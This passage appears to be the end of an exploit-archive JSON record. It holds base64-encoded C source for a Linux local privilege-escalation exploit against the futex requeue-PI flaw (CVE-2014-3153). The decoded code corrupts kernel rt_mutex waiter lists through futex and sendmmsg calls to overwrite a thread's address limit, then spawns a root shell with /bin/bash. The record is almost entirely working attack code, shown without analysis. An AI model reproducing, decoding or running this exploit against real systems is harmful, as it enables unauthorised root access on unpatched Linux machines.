0IGZhaWxlZFxuIik7DQoJCXVzbGVlcCgxMCk7DQoJfSBlbHNlIHsNCgkJYWRkci5zaW5fZmFtaWx5ID0gQUZfSU5FVDsNCgkJYWRkci5zaW5fcG9ydCA9IGh0b25zKExPQ0FMX1BPUlQpOw0KCQlhZGRyLnNpbl9hZGRyLnNfYWRkciA9IGh0b25sKElOQUREUl9MT09QQkFDSyk7DQoJfQ0KCQ0KCXdoaWxlIChjb25uZWN0KHNvY2tmZCwgKHN0cnVjdCBzb2NrYWRkciAqKSZhZGRyLCAxNikgPCAwKSB7DQoJCXVzbGVlcCgxMCk7DQoJfQ0KCQ0KCXNvY2tfYnVmX3NpemUgPSAxOw0KCXNldHNvY2tvcHQoc29ja2ZkLCBTT0xfU09DS0VULCBTT19TTkRCVUYsIChjaGFyICopJnNvY2tfYnVmX3NpemUsIHNpemVvZihzb2NrX2J1Zl9zaXplKSk7DQoJDQoJcmV0dXJuIHNvY2tmZDsNCn0NCg0KdW5zaWduZWQgbG9uZyBpb3ZfYmFzZTAsIGlvdl9iYXNleDsNCnNpemVfdCBpb3ZfbGVuMCwgaW92X2xlbng7DQoNCnN0YXRpYyB2b2lkICpjbGllbnRfdG9fc2V0dXBfcnRfd2FpdGVyKHZvaWQgKndhaXRlcl9wbGlzdCkNCnsNCglpbnQgc29ja2ZkOw0KCXN0cnVjdCBtbXNnaGRyIG1zZ3ZlY1sxXTsNCglzdHJ1Y3QgaW92ZWMgbXNnX2lvdls4XTsNCgl1bnNpZ25lZCBsb25nIGRhdGFidWZbMHgyMF07DQoJaW50IGk7DQoJaW50IHJldDsNCglzdHJ1Y3Qgc2lnYWN0aW9uIGFjdDsNCgkNCglhY3Quc2FfaGFuZGxlciA9IHZvaWRfaGFuZGxlcjsNCglzaWdlbXB0eXNldCgmYWN0LnNhX21hc2spOw0KCWFjdC5zYV9mbGFncyA9IDA7DQoJYWN0LnNhX3Jlc3RvcmVyID0gTlVMTDsNCglzaWdhY3Rpb24oU0lHTkFMX1RIUkVBRF9FWElULCAmYWN0LCBOVUxMKTsNCgkNCgl3YWl0ZXJfdGhyZWFkX3RpZCA9IHN5c2NhbGwoX19OUl9nZXR0aWQpOw0KCXNldHByaW9yaXR5KFBSSU9fUFJPQ0VTUywgMCwgMTIpOw0KCQ0KCXNvY2tmZCA9IGNvbm5lY3Rfc2VydmVyX3NvY2tldCgpOw0KCWNsaWVudGZkID0gc29ja2ZkOw0KCQ0KCWZvciAoaSA9IDA7IGkgPCBBUlJBWV9TSVpFKGRhdGFidWYpOyBpKyspIHsNCglkYXRhYnVmW2ldID0gKHVuc2lnbmVkIGxvbmcpd2FpdGVyX3BsaXN0Ow0KCX0NCgkNCglmb3IgKGkgPSAwOyBpIDwgQVJSQVlfU0laRShtc2dfaW92KTsgaSsrKSB7DQoJbXNnX2lvdltpXS5pb3ZfYmFzZSA9IHdhaXRlcl9wbGlzdDsNCgltc2dfaW92W2ldLmlvdl9sZW4gPSAobG9uZyl3YWl0ZXJfcGxpc3Q7DQoJfQ0KCW1zZ19pb3ZbMV0uaW92X2Jhc2UgPSAodm9pZCAqKWlvdl9iYXNlMDsNCgkNCgltc2d2ZWNbMF0ubXNnX2hkci5tc2dfbmFtZSA9IGRhdGFidWY7DQoJbXNndmVjWzBdLm1zZ19oZHIubXNnX25hbWVsZW4gPSBzaXplb2YgZGF0YWJ1ZjsNCgltc2d2ZWNbMF0ubXNnX2hkci5tc2dfaW92ID0gbXNnX2lvdjsNCgltc2d2ZWNbMF0ubXNnX2hkci5tc2dfaW92bGVuID0gQVJSQVlfU0laRShtc2dfaW92KTsNCgltc2d2ZWNbMF0ubXNnX2hkci5tc2dfY29udHJvbCA9IGRhdGFidWY7DQoJbXNndmVjWzBdLm1zZ19oZHIubXNnX2NvbnRyb2xsZW4gPSBBUlJBWV9TSVpFKGRhdGFidWYpOw0KCW1zZ3ZlY1swXS5tc2dfaGRyLm1zZ19mbGFncyA9IDA7DQoJbXNndmVjWzBdLm1zZ19sZW4gPSAwOw0KCQ0KCXN5c2NhbGwoX19OUl9mdXRleCwgJnN3YWcsIEZVVEVYX1dBSVRfUkVRVUVVRV9QSSwgMCwgMCwgJnN3YWcyLCAwKTsNCgkNCglzeW5jX3dpdGhfcGFyZW50KCZkb19zb2NrZXRfdGlkX3JlYWQsICZkaWRfc29ja2V0X3RpZF9yZWFkKTsNCgkNCglyZXQgPSAwOw0KCQ0KCXdoaWxlICgxKSB7DQoJcmV0ID0gc3lzY2FsbChfX05SX3NlbmRtbXNnLCBzb2NrZmQsIG1zZ3ZlYywgMSwgMCk7DQoJaWYgKHJldCA8PSAwKSB7DQoJCWJyZWFrOw0KCX0gZWxzZSANCgkJcHJpbnRmKCJzZW5kbW1zZyByZXQgJWRcbiIsIHJldCk7DQoJfQ0KCXJldHVybiBOVUxMOw0KfQ0KDQpzdGF0aWMgdm9pZCBwbGlzdF9zZXRfbmV4dChzdHJ1Y3QgbGlzdF9oZWFkICpub2RlLCBzdHJ1Y3QgbGlzdF9oZWFkICpoZWFkKQ0Kew0KCW5vZGUtPm5leHQgPSBoZWFkOw0KCWhlYWQtPnByZXYgPSBub2RlOw0KCW5vZGUtPnByZXYgPSBoZWFkOw0KCWhlYWQtPm5leHQgPSBub2RlOw0KfQ0KDQpzdGF0aWMgdm9pZCBzZXR1cF93YWl0ZXJfcGFyYW1zKHN0cnVjdCBydF9tdXRleF93YWl0ZXIgKnJ0X3dhaXRlcnMpDQp7DQoJcnRfd2FpdGVyc1swXS5saXN0X2VudHJ5LnByaW8gPSBVU0VSX1BSSU9fQkFTRSArIDk7DQoJcnRfd2FpdGVyc1sxXS5saXN0X2VudHJ5LnByaW8gPSBVU0VSX1BSSU9fQkFTRSArIDEzOw0KCXBsaXN0X3NldF9uZXh0KCZydF93YWl0ZXJzWzBdLmxpc3RfZW50cnkucHJpb19saXN0LCAmcnRfd2FpdGVyc1sxXS5saXN0X2VudHJ5LnByaW9fbGlzdCk7DQoJcGxpc3Rfc2V0X25leHQoJnJ0X3dhaXRlcnNbMF0ubGlzdF9lbnRyeS5ub2RlX2xpc3QsICZydF93YWl0ZXJzWzFdLmxpc3RfZW50cnkubm9kZV9saXN0KTsNCn0NCg0Kc3RhdGljIGJvb2wgZG9fZXhwbG9pdCh2b2lkICp3YWl0ZXJfcGxpc3QpDQp7DQoJdm9pZCAqbWFnaWN2YWwsICptYWdpY3ZhbDI7DQoJc3RydWN0IHJ0X211dGV4X3dhaXRlciAqcnRfd2FpdGVyczsNCglwaWRfdCBwaWQ7DQoJcGlkX3QgcGlkNiwgcGlkNywgcGlkMTIsIHBpZDExOw0KCQ0KCXJ0X3dhaXRlcnMgPSBQUklPX0xJU1RfVE9fV0FJVEVSKHdhaXRlcl9wbGlzdCk7DQoJDQoJc3lzY2FsbChfX05SX2Z1dGV4LCAmc3dhZzIsIEZVVEVYX0xPQ0tfUEksIDEsIDAsIE5VTEwsIDApOw0KCQ0KCXdoaWxlIChzeXNjYWxsKF9fTlJfZnV0ZXgsICZzd2FnLCBGVVRFWF9DTVBfUkVRVUVVRV9QSSwgMSwgMCwgJnN3YWcyLCBzd2FnKSAhPSAxKSB7DQoJCXVzbGVlcCgxMCk7DQoJfQ0KCQ0KCXB0aHJlYWRfdCB0aDYgPSAgY3JlYXRlX3RocmVhZF9kb19mdXRleF9sb2NrX3BpX3dpdGhfcHJpb3JpdHkoNik7DQoJcHRocmVhZF90IHRoNyA9ICBjcmVhdGVfdGhyZWFkX2RvX2Z1dGV4X2xvY2tfcGlfd2l0aF9wcmlvcml0eSg3KTsNCgkNCglzd2FnMiA9IDA7DQoJZG9fc29ja2V0X3RpZF9yZWFkID0gMDsNCglkaWRfc29ja2V0X3RpZF9yZWFkID0gMDsNCgkNCglzeXNjYWxsKF9fTlJfZnV0ZXgsICZzd2FnMiwgRlVURVhfQ01QX1JFUVVFVUVfUEksIDEsIDAsICZzd2FnMiwgc3dhZzIpOw0KCQ0KCWlmIChzeW5jX3dpdGhfY2hpbGRfZ2V0Y2hhcih3YWl0ZXJfdGhyZWFkX3RpZCwgJmRvX3NvY2tldF90aWRfcmVhZCwgJmRpZF9zb2NrZXRfdGlkX3JlYWQpIDwgMCkgew0KCXJldHVybiBmYWxzZTsNCgl9DQoJDQoJc2V0dXBfd2FpdGVyX3BhcmFtcyhydF93YWl0ZXJzKTsNCgltYWdpY3ZhbCA9IHJ0X3dhaXRlcnNbMF0ubGlzdF9lbnRyeS5wcmlvX2xpc3QubmV4dDsNCglwcmludGYoIkNoZWNraW5nIHdoZXRoZXIgZXhwbG9pdGFibGUuLiIpOw0KCXB0aHJlYWRfdCB0aDExID0gIGNyZWF0ZV90aHJlYWRfZG9fZnV0ZXhfbG9ja19waV93aXRoX3ByaW9yaXR5KDExKTsNCgkNCglpZiAocnRfd2FpdGVyc1swXS5saXN0X2VudHJ5LnByaW9fbGlzdC5uZXh0ID09IG1hZ2ljdmFsKSB7DQoJCXByaW50ZigiZmFpbGVkXG4iKTsNCgkJcmV0dXJuIGZhbHNlOw0KCX0NCglwcmludGYoIk9LXG5TZWFjaGluZyBnb29kIG1hZ2ljLi4uXG4iKTsNCgltYWdpY3ZhbCA9IHJ0X3dhaXRlcnNbMF0ubGlzdF9lbnRyeS5wcmlvX2xpc3QubmV4dDsNCgkNCglwdGhyZWFkX2NhbmNlbF9pbW1lZGlhdGVseSh0aDExKTsNCgkNCglwdGhyZWFkX3QgdGgxMV8xLCB0aDExXzI7DQoJd2hpbGUoMSkgew0KCQlzZXR1cF93YWl0ZXJfcGFyYW1zKHJ0X3dhaXRlcnMpOw0KCQl0aDExXzEgPSBjcmVhdGVfdGhyZWFkX2RvX2Z1dGV4X2xvY2tfcGlfd2l0aF9wcmlvcml0eSgxMSk7DQoJCW1hZ2ljdmFsID0gcnRfd2FpdGVyc1swXS5saXN0X2VudHJ5LnByaW9fbGlzdC5uZXh0Ow0KCQloYWNrX3RocmVhZF9zdGFjayA9IChzdHJ1Y3QgdGhyZWFkX2luZm8gKikoKHVuc2lnbmVkIGxvbmcpbWFnaWN2YWwgJiAweGZmZmZmZmZmZmZmZmUwMDApOw0KCQlydF93YWl0ZXJzWzFdLmxpc3RfZW50cnkubm9kZV9saXN0LnByZXYgPSAodm9pZCAqKSZoYWNrX3RocmVhZF9zdGFjay0+YWRkcl9saW1pdDsNCgkJDQoJCXRoMTFfMiA9IGNyZWF0ZV90aHJlYWRfZG9fZnV0ZXhfbG9ja19waV93aXRoX3ByaW9yaXR5KDExKTsNCgkJbWFnaWN2YWwyID0gcnRfd2FpdGVyc1sxXS5saXN0X2VudHJ5Lm5vZGVfbGlzdC5wcmV2Ow0KCQkNCgkJcHJpbnRmKCJtYWdpYzE9JXAgbWFnaWMyPSVwXG4iLCBtYWdpY3ZhbCwgbWFnaWN2YWwyKTsNCgkJaWYobWFnaWN2YWwgPCBtYWdpY3ZhbDIpIHsNCgkJCXByaW50ZigiR29vZCBtYWdpYyBmb3VuZFxuSGFja2luZy4uLlxuIik7DQoJCQlicmVhazsNCgkJfSBlbHNlIHsNCgkJCXB0aHJlYWRfY2FuY2VsX2ltbWVkaWF0ZWx5KHRoMTFfMSk7DQoJCQlwdGhyZWFkX2NhbmNlbF9pbW1lZGlhdGVseSh0aDExXzIpOw0KCQl9CQkNCgl9DQoJcHdhaXRlcjExID0gTk9ERV9MSVNUX1RPX1dBSVRFUihtYWdpY3ZhbDIpOw0KCXB0aHJlYWRfbXV0ZXhfbG9jaygmaGFja2VkX2xvY2spOw0KCXB0aHJlYWRfa2lsbCh0aDExXzEsIFNJR05BTF9IQUNLX0tFUk5FTCk7DQoJcHRocmVhZF9jb25kX3dhaXQoJmhhY2tlZCwgJmhhY2tlZF9sb2NrKTsNCglwdGhyZWFkX211dGV4X3VubG9jaygmaGFja2VkX2xvY2spOw0KCWNsb3NlKGxpc3RlbmZkKTsNCgkNCglzdHJ1Y3QgcnRfbXV0ZXhfd2FpdGVyIHdhaXRlcjExOw0KCXN0cnVjdCBydF9tdXRleCAqcG11dGV4Ow0KCWludCBsZW4gPSByZWFkX3BpcGUocHdhaXRlcjExLCAmd2FpdGVyMTEsIHNpemVvZih3YWl0ZXIxMSkpOw0KCWlmKGxlbiAhPSBzaXplb2Yod2FpdGVyMTEpKSB7DQoJCXBtdXRleCA9IE5VTEw7DQoJfSBlbHNlIHsNCgkJcG11dGV4ID0gd2FpdGVyMTEubG9jazsNCgl9DQoJZml4X3J0X211dGV4X3dhaXRlcl9saXN0KHBtdXRleCk7DQoJDQoJcHRocmVhZF9jYW5jZWxfaW1tZWRpYXRlbHkodGgxMV8xKTsNCglwdGhyZWFkX2NhbmNlbF9pbW1lZGlhdGVseSh0aDExXzIpOw0KCQ0KCXB0aHJlYWRfY2FuY2VsX2ltbWVkaWF0ZWx5KHRoNyk7DQoJcHRocmVhZF9jYW5jZWxfaW1tZWRpYXRlbHkodGg2KTsNCgljbG9zZShjbGllbnRmZCk7DQoJcHRocmVhZF9jYW5jZWxfaW1tZWRpYXRlbHkodGhyZWFkX2NsaWVudF90b19zZXR1cF9ydF93YWl0ZXIpOw0KCQ0KCWV4aXQoMCk7DQp9DQoNCiNkZWZpbmUgTU1BUF9BRERSX0JBU0UJMHgwYzAwMDAwMA0KI2RlZmluZSBNTUFQX0xFTgkJMHgwYzAwMTAwMA0KDQppbnQgbWFpbihpbnQgYXJnYywgY2hhciAqYXJndltdKQ0Kew0KCXVuc2lnbmVkIGxvbmcgbWFwcGVkX2FkZHJlc3M7DQoJdm9pZCAqd2FpdGVyX3BsaXN0Ow0KCQ0KCXByaW50ZigiQ1ZFLTIwMTQtMzE1MyBleHBsb2l0IGJ5IENoZW4gS2FpcXUoa2FpcXVjaGVuQDE2My5jb20pXG4iKTsNCiAgDQoJbWFpbl9waWQgPSBnZXR0aWQoKTsNCglpZihmb3JrKCkgPT0gMCkgew0KCQlpb3ZfYmFzZTAgPSAodW5zaWduZWQgbG9uZyltbWFwKCh2b2lkICopMHhiMDAwMDAwMCwgMHgxMDAwMCwgUFJPVF9SRUFEIHwgUFJPVF9XUklURSB8IFBST1RfRVhFQywgLypNQVBfUE9QVUxBVEUgfCovIE1BUF9TSEFSRUQgfCBNQVBfRklYRUQgfCBNQVBfQU5PTllNT1VTLCAtMSwgMCk7DQoJCWlmIChpb3ZfYmFzZTAgPCAweGIwMDAwMDAwKSB7DQoJCQlwcmludGYoIm1tYXAgZmFpbGVkP1xuIik7DQoJCQlyZXR1cm4gMTsNCgkJfQ0KCQlpb3ZfbGVuMCA9IDB4MTAwMDA7DQoJCQ0KCQlpb3ZfYmFzZXggPSAodW5zaWduZWQgbG9uZyltbWFwKCh2b2lkICopTU1BUF9BRERSX0JBU0UsIE1NQVBfTEVOLCBQUk9UX1JFQUQgfCBQUk9UX1dSSVRFIHwgUFJPVF9FWEVDLCBNQVBfU0hBUkVEIHwgTUFQX0ZJWEVEIHwgTUFQX0FOT05ZTU9VUywgLTEsIDApOw0KCQlpZiAoaW92X2Jhc2V4IDwgTU1BUF9BRERSX0JBU0UpIHsNCgkJCXByaW50ZigibW1hcCBmYWlsZWQ/XG4iKTsNCgkJCXJldHVybiAxOw0KCQl9DQoJCWlvdl9sZW54ID0gTU1BUF9MRU47DQoJCQ0KCQl3YWl0ZXJfcGxpc3QgPSAodm9pZCAqKWlvdl9iYXNleCArIDB4NDAwOw0KCQlwdGhyZWFkX2NyZWF0ZSgmdGhyZWFkX2NsaWVudF90b19zZXR1cF9ydF93YWl0ZXIsIE5VTEwsIGNsaWVudF90b19zZXR1cF9ydF93YWl0ZXIsIHdhaXRlcl9wbGlzdCk7DQoJCQ0KCQlzb2NrZmQgPSBzZXJ2ZXJfZm9yX3NldHVwX3J0X3dhaXRlcigpOw0KCQlpZiAoc29ja2ZkIDwgMCkgew0KCQkJcHJpbnRmKCJTZXJ2ZXIgZmFpbGVkXG4iKTsNCgkJCXJldHVybiAxOw0KCQl9DQoJCQ0KCQlpZiAoIWRvX2V4cGxvaXQod2FpdGVyX3BsaXN0KSkgew0KCQkJcmV0dXJuIDE7DQoJCX0NCgkJcmV0dXJuIDA7DQoJfQ0KDQoJd2hpbGUoZ2V0dWlkKCkpDQoJCXVzbGVlcCgxMDApOw0KCWV4ZWNsKCIvYmluL2Jhc2giLCAiYmluL2Jhc2giLCBOVUxMKTsNCglyZXR1cm4gMDsNCn0=", 
    "filename": "platforms/linux/local/35370.c", 
    "id": "35370", 
    "cves": [
        "CVE-2014-3153"
    ]
}